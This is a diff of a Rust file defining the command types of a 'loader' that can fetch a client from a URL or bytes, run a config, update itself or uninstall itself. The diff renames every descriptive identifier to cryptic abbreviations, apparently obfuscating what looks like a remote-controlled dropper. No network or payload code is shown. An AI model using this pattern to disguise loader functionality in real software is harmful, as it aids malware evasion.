@@ -6,52 +6,52 @@ use crate::constants::{
 };
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct LoaderReceivePayload {
-    pub action: ClientAction,
-    pub params: ClientParams,
+pub struct LdrRcv {
+    pub action: ClAct,
+    pub params: ClPrms,
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub enum ClientAction {
-    RunConfig,
-    UninstallSelf,
-    UpdateSelf,
+pub enum ClAct {
+    RnCnfg,
+    UnsSlf,
+    UpdSlf,
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub enum ClientParams {
-    RunConfig(RunConfigParams),
-    UninstallSelf(UninstallSelfParams),
-    UpdateSelf(UpdateSelfParams),
+pub enum ClPrms {
+    RnCnfg(RnCnfgPrms),
+    UnsSlf(UnsSlfPrms),
+    UpdSlf(UpdSlfPrms),
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub enum FileSource {
+pub enum FlSrc {
     Url(String),
-    Bytes(Vec<u8>),
+    Bt(Vec<u8>),
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct RunConfigParams {
-    pub enabled: bool, // if disabled not even run
-    pub client_source: Option<FileSource>,
-    pub client_version: u64,
-    pub self_source: Option<FileSource>,
-    pub self_version_latest: u64,
-    pub update_enabled: bool, // reinstall updated if version higher
+pub struct RnCnfgPrms {
+    pub enbl: bool, // if disabled not even run
+    pub cl_src: Option<FlSrc>,
+    pub cl_vrs: u64,
+    pub slf_src: Option<FlSrc>,
+    pub slf_vrs: u64,
+    pub upd_enbl: bool, // reinstall updated if version higher
 }
 
-impl Default for RunConfigParams {
+impl Default for RnCnfgPrms {
     fn default() -> Self {
         Self {
-            enabled: true,
-            client_source: hardcoded_client_fallback_source(),
-            client_version: hardcoded_client_version(),
-            self_source: None,
-            self_version_latest: loader_version(),
-            update_enabled: false,
+            enbl: true,
+            cl_src: hardcoded_client_fallback_source(),
+            cl_vrs: hardcoded_client_version(),
+            slf_src: None,
+            slf_vrs: loader_version(),
+            upd_enbl: false,
         }
     }
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct UninstallSelfParams {}
+pub struct UnsSlfPrms {}
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct UpdateSelfParams {}
+pub struct UpdSlfPrms {}
